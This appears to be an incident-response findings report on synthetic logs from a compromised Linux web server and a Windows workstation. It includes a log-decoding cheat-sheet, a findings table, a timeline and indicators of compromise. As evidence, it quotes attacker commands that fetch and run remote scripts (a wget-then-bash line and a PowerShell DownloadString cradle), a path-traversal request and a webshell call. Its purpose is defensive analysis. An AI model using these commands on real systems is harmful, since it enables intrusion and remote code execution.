# Investigation Findings

Source: `analyze_logs.py` (raw output in `analysis_output.txt`). All data is synthetic.
Hosts: **web01** = 10.0.1.20 (Linux/Apache), **WS-014** = Windows workstation (user jsmith).

## How to read each log (decoding cheat-sheet)

| Log | Pattern | Meaning |
|---|---|---|
| auth.log | `Failed password for invalid user admin from IP` | Login failed; "invalid user" = account doesn't exist (guessing usernames) |
| auth.log | `Accepted password for X from IP` | Successful login. Password (not key) auth from an external IP is the red flag |
| auth.log | `sudo: X : ... COMMAND=...` | X ran a command as root; the full command is recorded |
| auth.log | `useradd` / `usermod ... group 'sudo'` | New account created and given admin rights |
| Apache | `IP - - [time] "METHOD path" status size "ref" "UA"` | Status 200 = served, 403 = forbidden, 404 = not found, 500 = server error (often from injected input) |
| Apache | `%27`, `%20`, `%2f` | URL encoding: `'`, space, `/`. Decode before judging |
| Firewall | `ACCEPT OUT ... DPT=4444` | Internal host initiating an outbound connection to port 4444 (common reverse-shell port) |
| Windows | 4625 / 4624 | Logon failed / succeeded. LogonType 10 = RDP |
| Windows | 4688 | Process created. Parent -> child relationship is the key signal |
| Windows | 4698 | Scheduled task created (persistence) |
| PowerShell | `-enc <base64>` | Base64 of **UTF-16LE** text. Decode: `base64 -d` then convert from UTF-16LE |

## Findings

| # | Severity | Finding | Evidence |
|---|---|---|---|
| F1 | High | SSH brute force then compromise of `deploy` | 42 failures from 203.0.113.45 (03:12-03:19), then `Accepted password for deploy` at 03:19:42 |
| F2 | Critical | Post-compromise payload download and execution as root | sudo `wget http://198.51.100.77/x.sh -O /tmp/.x.sh` (03:21:03) and `bash /tmp/.x.sh` (03:21:30); firewall shows outbound :80 to the same IP at 03:21:01 |
| F3 | Critical | Persistence on web01 | New user `svc_backup` (UID 1005) added to `sudo` at 03:22; root cron session 03:23 |
| F4 | Critical | Command-and-control beaconing | 12 connections 10.0.1.20 -> 198.51.100.77:4444, one per ~60 s, 03:24-03:35 |
| F5 | High | Attempted lateral movement | 10.0.1.20 -> 10.0.1.35:445 ACCEPT, 10.0.1.36:445 DENY at 03:40 |
| F6 | High | Web recon and SQL injection | Nikto scan then sqlmap UA from 203.0.113.45 at 02:50-02:58; UNION SELECT on `product.php?id=` returned 200 with growing response size |
| F7 | Critical | Path traversal and probable webshell | 192.0.2.88: `../../../../etc/passwd` returned 200 (1843 B); `POST /upload.php` 200; `/uploads/shell.php?cmd=whoami` 200 |
| F8 | Medium | RDP password guessing on WS-014 | 8 failures on `Administrator` + 1 on `jsmith` from 192.0.2.88 at ~04:00-04:09 (no success logged) |
| F9 | Critical | Macro-based initial access on WS-014 | `WINWORD.EXE` (Invoice_Q3.docm) spawned hidden PowerShell with encoded command |
| F10 | High | Decoded payload and persistence | Decoded: `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/a.ps1')`; `whoami /all`; scheduled task `\Updater` runs `u.ps1` hidden |

## Reconstructed timeline (UTC, 2026-10-27)

| Time | Host | Event |
|---|---|---|
| 02:50-02:55 | web01 | Nikto scan from 203.0.113.45 |
| 02:58 | web01 | sqlmap SQL injection attempts |
| 03:00-03:06 | web01 | 192.0.2.88: traversal, upload, webshell command execution |
| 03:12-03:19 | web01 | SSH brute force, success as `deploy` |
| 03:21 | web01 | `x.sh` downloaded from 198.51.100.77 and run as root |
| 03:22 | web01 | `svc_backup` created, added to sudo |
| 03:24-03:35 | web01 | C2 beacon every 60 s to :4444 |
| 03:31 | web01 | `deploy` SSH session closes (beacon continues, so access is no longer SSH-dependent) |
| 03:40 | web01 | SMB probes to 10.0.1.35 / .36 |
| 04:00-04:09 | WS-014 | RDP guessing from 192.0.2.88 |
| 08:41 | WS-014 | Invoice_Q3.docm opened, encoded PowerShell, same C2 IP |
| 08:42 | WS-014 | Scheduled task `\Updater` created |

## Indicators of compromise

| Type | Value |
|---|---|
| IP | 203.0.113.45 (scanner/SQLi/SSH brute force) |
| IP | 192.0.2.88 (traversal/webshell/RDP guessing) |
| IP | 198.51.100.77 (payload host + C2, ports 80 and 4444) |
| File | /tmp/.x.sh, /var/www/.../uploads/shell.php, C:\Users\jsmith\AppData\Roaming\u.ps1, Invoice_Q3.docm |
| Account | svc_backup (Linux, unauthorised); deploy (compromised) |
| Task | `\Updater` (Windows scheduled task) |
| User-Agent | `sqlmap/1.7.2`, `Nikto/2.5.0` |

## Caveats

- HTTP 200 on an injection or traversal request shows the server responded, not that data was stolen. Response size and application logs are needed to confirm.
- 203.0.113.45 and 192.0.2.88 may be the same actor or different ones. The shared C2 address (198.51.100.77) links web01 and WS-014 activity, so treat it as one campaign pending more evidence.
- The logs do not show what `x.sh` or `a.ps1` contained. That must come from disk or memory forensics.
